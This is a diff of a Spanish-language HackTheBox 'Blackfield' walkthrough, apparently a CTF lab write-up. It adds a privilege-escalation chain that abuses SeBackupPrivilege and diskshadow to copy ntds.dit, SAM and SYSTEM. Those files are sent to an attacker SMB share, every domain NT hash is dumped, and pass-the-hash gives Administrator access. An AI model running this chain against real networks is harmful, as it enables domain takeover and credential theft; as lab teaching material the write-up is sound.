@@ -3,7 +3,6 @@ title: HackTheBox - Blackfield
 published: true
 ---
 
-Text can be **bold**, _italic_, ~~strikethrough~~ or `keyword`.
 
 ## [](#header-2)Fase de reconocimiento
 
@@ -50,7 +49,7 @@ nmap -sCV -p<ports> 10.10.10.192 -oN scanports
         smbmap -H 10.10.10.192 "null" -r profiles$
 
 de esta manera podemos ver mas informacion (en las carpetas que tenemos privilegios)
-en la carpeta profiles$ vamos a encontras mas 300 usurios del dominio pero hay
+en la carpeta profiles$ vamos a encontrar mas de 300 usurios del dominio pero hay
 que ver cuales son validas con el `DC (Domain Controller)`
 
 - Vamos a validar estos usuarios con kerbrute
@@ -141,7 +140,7 @@ del dominio
 2. Find Paths from Kerberoastable Users
 3. Find AS-REP Roastable Users
 
-- vemos que es usuario support es asreproasteable. Le damos un clic derecho al usuario y lo seteamos a Mark User as Owned.
+- vemos que el usuario support es asreproasteable. Le damos un clic derecho al usuario y lo seteamos a Mark User as Owned.
 Vamos a Node Info y miramos donde hay 1. Vemos que el usuario support puede forzar un cambio de contraseña al usuario audit2020 -> es decir que tiene privilegios
 sobre la maquina audit2020
 
@@ -259,7 +258,9 @@ unzipeamos el lsass.zip para despues dumpear el contenido con pypykatz
 
 tenemos hashes NT que nos sirve para realizar PassTheHash sin proporcionar contraseña en texto claro
 
-- HASH NT del usuario svc_backup -> 9658d1d1dcd9250115e2205d9f48400d tambien obtuvimos el NT del usuario Admin del dominio
+- HASH NT del usuario svc_backup 
+
+9658d1d1dcd9250115e2205d9f48400d tambien obtuvimos el NT del usuario Admin del dominio
 pero son invalidas, ahora vamos a validar el NT del usuario svc_backup
 
 ## [](#header-2)SHELL svc_backup
@@ -294,13 +295,155 @@ y nos muestra un Pwned!! esto quiere decir que podemos conectarnos con evil-winr
      blackfield\svc_backup
 
 esta seria la primera parte de la maquina, tenemos ejecucion remota de comandos y ya podemos ver la flag
-(user.txt) esta ubicada en C:\Users\svc_backup\Desktop\users.txt
+(user.txt) esta ubicada en 
+
+    C:\Users\svc_backup\Desktop\users.txt
 
 ## [](#header-2)Escalada de Privilegios
+
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
 
+    PRIVILEGES INFORMATION
+    ----------------------
+
+    Privilege Name                Description                    State
+    ============================= ============================== =======
+    SeMachineAccountPrivilege     Add workstations to domain     Enabled
+    SeBackupPrivilege             Back up files and directories  Enabled
+    SeRestorePrivilege            Restore files and directories  Enabled
+    SeShutdownPrivilege           Shut down the system           Enabled
+    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+una vez dentro de la maquina vamos a fijarnos en cual de todos los grupos se encuentra svc_backup
+net user svc_backup -> Backup Operators es un grupo predeterminado de Windows que esta diseñado para respaldar
+y restaurar archivos en la pc usando ciertos metodos para leer y escribir todos los archivos del sistema
+
+    *Evil-WinRM* PS C:\> net user svc_backup
+
+## [](##header-2)SeBackupPrivilege
+
+Teniendo este privilegio, podriamos hacer una copia (backup) de seguridad de elemento del sistema como el NTDS que nos permitiria 
+recuperar los hashes de los usuarios del sistema, entre ellos el usuario Administrator.
+Es un privilegio avanzado de Windows que se otorga a cuentas especificas que tienen permiso para realizar copias
+de seguridad y restauracion de archivos y carpetas. Este privilegio se utiliza comunmente en aplicaciones de copia de 
+seguridad y restauracion.
+
+el repositorio SeBackupPrivilege.github tiene un buen conjunto de herramientas PowerShell y tendremos que subir
+2 archivos a la maquina
+
+    upload /home/atreus/HTB/blackfield/content/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
+    upload /home/atreus/HTB/blackfield/content/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdUtils.dll
+
+y vamos a importar los 2 
+
+    import-module .\SeBackupPrivilegeCmdLets.dll
+    import-module .\SeBackupPrivilegeCmdUtils.dll
+
+ahora podemos leer archivos en todo el sistema por ejemplo no podemos leer el netlogon.dns
+pero podemos copiarlo y leerlo
+
+    *Evil-WinRM* PS C:\Windows\System32\config> Copy-FileSeBackupPrivilege netlogon.dns \Windows\Temp\netlogon.dns
+    *Evil-WinRM* PS C:\Windows\System32\config> cd C:\Windows\Temp
+
+lastimosamente no podemos leer el root.txt y leer la flag de la maquina pero...
+podemos buscar y tomar el ntds.dit la base de datos en el DC que contiene todos los hash
+de contraseñas. Desafortunadamente no lo podemos agarrar porque esta en uso.
+
+## [](##header-2)Dump SAM & SYSTEM
+
+    reg save HKLM\system system
+    reg save HKLM\sam sam
+
+- SAM -> es una base de datos que almacena informacion de cuentas de usuario y grupos locales en un sistema Windows
+
+- SYSTEM -> se refiere a la cuenta de sistema que ejecuta servicios y procesos en una sistema operativo Windows
+
+en conclusion trabajan juntos para autenticar y autorizar el acceso de usuarios y grupos a recursos en la red.
+`SAM` almacena informacion de cuentas de usuario y grupos locales, mientras que `SYSTEM` asegura que los servicios y
+procesos que requieren privilegios de sistema se ejecuten de manera segura.
 
 
+## [](##header-2)DISKSHADOW.EXE 
+
+es una herramienta de linea de comandos incluida en Windows que se utiliza para crear y administrar
+instantaneas de volumen, tambien conocidas como instataneas de volumen de sombra. Es util para realizar copias de 
+seguridad de datos y para proteger la integridad de los datos al permitir la recuperacion de datos en caso de perdida
+o daño. Tambien puede ser utilizado para realizar tareas de copia de archivos
+
+- Creando un volumen sombra con Diskshadow.exe 
+
+       set context persistent nowriters
+
+1. este comando crea un contexto de copia de seguridad persistente sin escritores
+
+       add volume c: alias atreus
+
+2. esto crea el volumen que deseamos sombrear en este caso la unidad C:\
+
+       create
+
+3. crear la unidad logica
+
+       expose %atreus% z:
+
+4. esto va a facilitar el acceso a los recursos compartidos con el alias que asignamos
+
+- este archivo text.txt lo subimos a la maquina en C:\Windows\Temp
+
+       set context persistent nowriters
+       add volume c: alias atreus
+       create
+       expose %atreus%
+ 
+## [](##header-2)Ejecucion de text.txt Diskshadow.exe 
+
+    diskshadow.exe /s c:\Windows\Temp\text.txt
+
+con esto ya podemos ingresar a la unidad logica z:\ que anteriormente creamos
+y vamos a poder ver todos los archivos de la maquina
+
+    dir z:\  
+    dir z:\Windows\NTDS\
+    robocopy /b z:\Windows\NTDS\ . ntds.dit y con esto ya tendriamos el ntds.dit
+
+no pude descargarme los archivos ntds.dit system sam por evil-winrm, asique me los transferi a mi 
+maquina con smbserver
+
+    impacket-smbserver smbFolder $(pwd) -smb2support -> desde mi maquina de atacante
+    copy ntds.dit \\10.10.X.X\smbFolder\ntds.dit -> desde la maquina victima comprometida
+    copy sam \\10.10.X.X\smbFolder\sam
+    copy system \\10.10.X.X\smbFolder\system
+
+## [](##header-2)Dump hashes NTDS y Shell ROOT
+
+    impacket-secretsdump.py -system system -ntds ntds.dit LOCAL  
+
+nos va a dumpear todos los hashes para realizar PASSTHEHASH
+
+    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+    [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+    [*] Searching for pekList, be patient
+    [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+    [*] Reading and decrypting hashes from ntds.dit 
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2a2f8ac26db968c93a17fefdb36c38ee:::
+    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+    audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+    support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+
+## [](##header-2)Validacion de Hash con Crackmapexec
+
+    crackmapexec smb 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
+    SMB    10.10.10.192  445  DC01   [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+    SMB    10.10.10.192  445  DC01   [+] BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
+
+## [](##header-2)Winrm Pass The Hash Administrator
+
+    evil-winrm -i blackfield.local -u 'Administrator' -H '<HASH>'
 
 
 
